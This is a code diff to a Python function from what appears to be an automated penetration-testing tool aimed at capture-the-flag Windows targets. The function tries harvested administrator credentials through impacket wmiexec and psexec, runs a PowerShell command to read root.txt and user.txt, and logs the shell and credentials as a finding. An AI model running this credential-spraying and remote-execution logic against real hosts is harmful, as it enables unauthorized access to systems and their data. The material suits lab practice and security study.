@@ -261,33 +261,44 @@ def _pivot_shell(host, ip, ports, triples) -> bool:
     win_users = getattr(host, "_win_users", set())
     ranked = sorted(triples, key=lambda t: (
         0 if t[1].lower() in ("administrator", "admin") or t[1] in win_users else 1))
-    getflag = ('cmd /c "type C:\\Users\\Administrator\\Desktop\\root.txt & '
-               'type C:\\Users\\Administrator\\Desktop\\user.txt & whoami"')
+    # Read both flags with one clean, newline-separated command (order-safe).
+    getflag = ('powershell -c "gci C:\\Users -Recurse -Force -Include '
+               'root.txt,user.txt -EA 0 | %{gc $_.FullName}"')
+    tried = set()
     for tool in ("wmiexec", "psexec"):
         cmd = _impacket_cmd(tool)
         if not cmd:
             continue
-        for dom, user, pw in ranked[:6]:
+        for dom, user, pw in ranked:
+            if (user, pw) in tried:
+                continue
+            tried.add((user, pw))
+            if len(tried) > 6:
+                break
             target = (f"{dom}/" if dom else "") + f"{user}:{pw}@{ip}"
-            utils.log("info", f"{tool} {dom or '.'}/{user}@{ip} -> root flag ...",
+            utils.log("info", f"{tool} {dom or '.'}/{user}@{ip} -> flags ...",
                       indent=1)
-            rc, out, err = utils.run(cmd + [target, getflag], timeout=90)
+            rc, out, err = utils.run(cmd + [target, getflag], timeout=60)
             blob = (out or "") + (err or "")
             if _tool_broke(blob):
                 break   # tool env issue — stop trying this tool
             low = blob.lower()
-            if ("login failed" in low or "access denied" in low
-                    or "rpc_s_access_denied" in low or not blob.strip()):
-                continue
+            if ("logon_failure" in low or "login failed" in low
+                    or "access_denied" in low or "access denied" in low
+                    or "authentication failed" in low or "timeout after" in low
+                    or "sessionerror" in low or not blob.strip()):
+                continue   # bad creds / no shell — next
             utils.log("hot", f"shell via {tool} as {user}", indent=1)
+            _show_output(blob)
+            got = _harvest_flags(host, blob, f"{tool} ({user})")
             host.add(Finding(
-                title=f"Shell via {tool} ({user})",
-                detail=f"impacket-{tool} {target.rsplit(':',1)[0]}:'{pw}'@{ip}",
+                title=f"Shell via {tool} ({user})"
+                      + (" — ROOT/SYSTEM" if got else ""),
+                detail=f"impacket-{tool} {target.rsplit(':', 1)[0]}:'{pw}'@{ip}",
                 severity="critical", category="access", service="smb",
                 evidence=f"{user}:{pw}"))
-            _show_output(blob)
-            if _harvest_flags(host, blob, f"{tool} ({user})"):
-                return True
+            if got:
+                return True   # flags captured — stop the storm
     return False
 
 
